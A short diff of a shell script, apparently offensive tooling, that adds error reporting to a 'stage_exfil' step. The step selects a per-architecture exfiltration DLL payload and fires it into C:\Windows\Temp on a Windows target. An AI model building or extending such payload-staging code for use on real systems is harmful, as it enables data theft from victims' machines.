@@ -385,7 +385,7 @@ stage_exfil() {
     dll=$(ARCH="$a" pick_payload exfil)
     [ -n "$dll" ] || { warn "no $a exfil payload"; continue; }
     log "FIRE: $(basename "$dll") (arch $a)"
-    fire_payload "$dll" 'C:\Windows\Temp' >/dev/null 2>&1
+    fire_payload "$dll" 'C:\Windows\Temp' || warn "fire failed for $a"
     break
   done
   info ""
